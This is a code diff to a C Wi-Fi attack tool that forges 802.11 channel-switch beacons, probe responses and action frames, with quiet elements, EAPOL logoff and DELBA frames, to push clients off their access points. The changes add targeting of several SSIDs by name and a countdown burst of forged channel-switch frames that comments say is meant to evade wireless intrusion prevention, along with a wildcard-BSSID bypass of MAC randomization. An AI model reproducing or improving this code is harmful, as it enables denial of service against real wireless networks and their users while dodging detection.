@@ -229,7 +229,9 @@ typedef struct {
   bool log_pmkid;
   bool spawn_rogue;
   bool unmask_hidden;
-  char target_ssid_track[MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking */
+  #define MAX_TRACK_SSIDS 8
+  char target_ssid_track[MAX_TRACK_SSIDS][MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking */
+  int target_ssid_track_cnt;
   char rogue_ssid[MAX_SSID_LEN + 1];
   double refresh_rate;
   char stats_file[MAX_PATH_LEN];
@@ -246,7 +248,8 @@ typedef struct {
   bool dual_radio;
   char iface2[MAX_IFACE];
   char export_file[MAX_PATH_LEN];
-  char target_ssid_track[MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking for stress */
+  char target_ssid_track[MAX_TRACK_SSIDS][MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking for stress */
+  int target_ssid_track_cnt;
 } stress_cfg_t;
 
 static void run_stress(stress_cfg_t *cfg);
@@ -631,7 +634,7 @@ static int mk_ds_ie(uint8_t *b, uint8_t ch) {
 
 /* [FIX 6] cur_ch parameter added to all beacon/probe builders */
 static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
-                         uint8_t cur_ch, uint8_t new_ch) {
+                         uint8_t cur_ch, uint8_t new_ch, uint8_t count) {
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);
@@ -660,7 +663,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 1; /* Instant channel switch trigger */
+  c->count = count;
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz/WiFi6 clients */
@@ -669,7 +672,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class (81=2.4G, 115=5G) */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = count; /* switch count */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -802,7 +805,7 @@ static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
 }
 
 static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
-                         uint8_t new_ch) {
+                         uint8_t new_ch, uint8_t count) {
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
@@ -814,7 +817,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 3;
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = count; /* switch count */
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) piggybacked */
   b[o++] = 60;
@@ -822,7 +825,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = count; /* switch count */
 
   /* [UPGRADE] Piggybacked Quiet Element (ID=40, len=6) to enforce radio silence */
   b[o++] = 40;
@@ -840,7 +843,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
 /* [FIX 8] Probe Response with client MAC parameter */
 static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
                              const uint8_t dst[6], const char *ssid,
-                             uint8_t cur_ch, uint8_t new_ch) {
+                             uint8_t cur_ch, uint8_t new_ch, uint8_t count) {
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, 0); /* [FIX 8] unicast */
@@ -867,7 +870,7 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 1; /* Instant channel switch trigger */
+  c->count = count;
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) */
@@ -876,7 +879,7 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = count; /* switch count */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -1634,7 +1637,7 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
 
   /* [FIX 6] All beacon builders now take cur_ch */
   f->csa_beacon.len =
-      mk_csa_beacon(f->csa_beacon.buf, bss, t->ssid, cur_ch, (uint8_t)new_ch);
+      mk_csa_beacon(f->csa_beacon.buf, bss, t->ssid, cur_ch, (uint8_t)new_ch, 1);
   f->quiet_beacon.len =
       mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);
 
@@ -1653,13 +1656,13 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
 
   f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
   f->csa_action.len =
-      mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch);
+      mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch, 1);
 
   /* [FIX 8] Probe response: unicast to client + broadcast */
   f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid,
-                                        cur_ch, (uint8_t)new_ch);
+                                        cur_ch, (uint8_t)new_ch, 1);
   f->probe_resp_bc.len = mk_probe_resp_csa(f->probe_resp_bc.buf, bss, BCAST,
-                                           t->ssid, cur_ch, (uint8_t)new_ch);
+                                           t->ssid, cur_ch, (uint8_t)new_ch, 1);
 
   f->delba.len = mk_delba(f->delba.buf, bss, cli);
   f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);
@@ -3932,7 +3935,6 @@ static void *stress_injector_thread(void *arg) {
 
   uint16_t seq = 0;
   stress_ap_t snap[STRESS_MAX_APS];
-  int ssid_track_len = a->cfg->target_ssid_track[0] ? (int)strlen(a->cfg->target_ssid_track) : 0;
 
   /* [FIX] Zero-Copy Packet Templating: Pre-build templates to avoid thousands
    * of mk_* calls per second */
@@ -3980,9 +3982,16 @@ static void *stress_injector_thread(void *arg) {
         continue;
 
       /* [FEATURE] SSID Tracking Filter */
-      if (ssid_track_len > 0) {
-        if (strncmp(snap[i].ssid, a->cfg->target_ssid_track, ssid_track_len) != 0)
-          continue;
+      if (a->cfg->target_ssid_track_cnt > 0) {
+        bool ssid_match = false;
+        for (int j = 0; j < a->cfg->target_ssid_track_cnt; j++) {
+          int tlen = strlen(a->cfg->target_ssid_track[j]);
+          if (tlen > 0 && strncmp(snap[i].ssid, a->cfg->target_ssid_track[j], tlen) == 0) {
+            ssid_match = true;
+            break;
+          }
+        }
+        if (!ssid_match) continue;
       }
 
       /* [FIX] AP Pool Sharding (Multi-Threading Load Balancer) */
@@ -4072,14 +4081,17 @@ static void *stress_injector_thread(void *arg) {
           redir = 11;
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
-        len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
-                            (uint8_t)redir);
+        /* [UPGRADE] Realistic Countdown Burst to evade WIPS */
+        for (int c = 3; c >= 1; c--) {
+          len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
+                              (uint8_t)redir, (uint8_t)c);
 
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          } else {
+            atomic_fetch_add(&g_pkts_fail, 1);
+          }
         }
       }
 
@@ -4103,23 +4115,26 @@ static void *stress_injector_thread(void *arg) {
           redir = 11;
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
-        /* 1. Target specific AP BSSID */
-        len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
-                                (uint8_t)redir);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        }
+        /* [UPGRADE] Realistic Countdown Burst */
+        for (int c = 3; c >= 1; c--) {
+          /* 1. Target specific AP BSSID */
+          len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
+                                  (uint8_t)redir, (uint8_t)c);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
 
-        /* 2. Wildcard BSSID (Bypass AP MAC Randomization)
-         * Sends Probe Response with BSSID=FF:FF:FF:FF:FF:FF.
-         * Clients searching for the SSID will process the CSA regardless of the
-         * AP's real MAC. */
-        len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
-                                (uint8_t)snap[i].channel, (uint8_t)redir);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
+          /* 2. Wildcard BSSID (Bypass AP MAC Randomization)
+           * Sends Probe Response with BSSID=FF:FF:FF:FF:FF:FF.
+           * Clients searching for the SSID will process the CSA regardless of the
+           * AP's real MAC. */
+          len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
+                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
         }
       }
 
@@ -4147,18 +4162,21 @@ static void *stress_injector_thread(void *arg) {
         if (redir < 1)
           redir = 11;
 
-        /* 1. Target specific AP BSSID */
-        len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        }
+        /* [UPGRADE] Realistic Countdown Burst */
+        for (int c = 3; c >= 1; c--) {
+          /* 1. Target specific AP BSSID */
+          len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
 
-        /* 2. Wildcard BSSID (Bypass MAC Randomization) */
-        len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
+          /* 2. Wildcard BSSID (Bypass MAC Randomization) */
+          len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
         }
       }
 
@@ -4877,7 +4895,7 @@ int main(int argc, char **argv) {
   bool global_dual_radio = false;
   char global_iface2[MAX_IFACE] = {0};
   char export_file[MAX_PATH_LEN] = "";
-  char global_target_ssid[MAX_SSID_LEN + 1] = {0};
+  char global_target_ssid_str[MAX_SSID_LEN * MAX_TRACK_SSIDS + 1] = {0};
   for (int i = 1; i < argc; i++) {
     if (strcmp(argv[i], "--stress") == 0)
       stress_mode = true;
@@ -4892,7 +4910,7 @@ int main(int argc, char **argv) {
     if (strcmp(argv[i], "--export") == 0 && i + 1 < argc)
       snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
     if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc)
-      snprintf(global_target_ssid, sizeof(global_target_ssid), "%s", argv[++i]);
+      snprintf(global_target_ssid_str, sizeof(global_target_ssid_str), "%s", argv[++i]);
   }
 
   if (stress_mode) {
@@ -4902,8 +4920,14 @@ int main(int argc, char **argv) {
     scfg.scan_5ghz = stress_5ghz;
     scfg.unmask_hidden = unmask_hidden;
     scfg.dual_radio = global_dual_radio;
-    if (global_target_ssid[0])
-      snprintf(scfg.target_ssid_track, sizeof(scfg.target_ssid_track), "%s", global_target_ssid);
+    
+    if (global_target_ssid_str[0]) {
+      char *token = strtok(global_target_ssid_str, ",");
+      while (token != NULL && scfg.target_ssid_track_cnt < MAX_TRACK_SSIDS) {
+        snprintf(scfg.target_ssid_track[scfg.target_ssid_track_cnt++], MAX_SSID_LEN + 1, "%s", token);
+        token = strtok(NULL, ",");
+      }
+    }
     if (global_dual_radio) {
       snprintf(scfg.iface2, sizeof(scfg.iface2), "%s", global_iface2);
     }
